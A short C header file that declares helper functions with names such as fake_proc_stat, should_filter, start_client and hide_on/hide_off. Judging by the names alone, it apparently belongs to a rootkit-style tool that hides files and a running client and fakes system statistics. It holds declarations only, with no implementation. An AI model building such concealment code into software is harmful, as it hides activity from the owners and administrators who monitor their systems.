#ifndef UTIL_H_
#define UTIL_H_

#include <stdio.h>
#include <stdbool.h>
#include <dirent.h>

int fake_proc_stat(void);
bool should_filter(char *filename, DIR *dirp);
bool client_running(void);
bool start_client(void);
bool fdname(int fd, char *buf, size_t size);
void print_realstat(void);
void hide_on(void);
void hide_off(void);
bool should_hide(void);

#endif // UTIL_H_
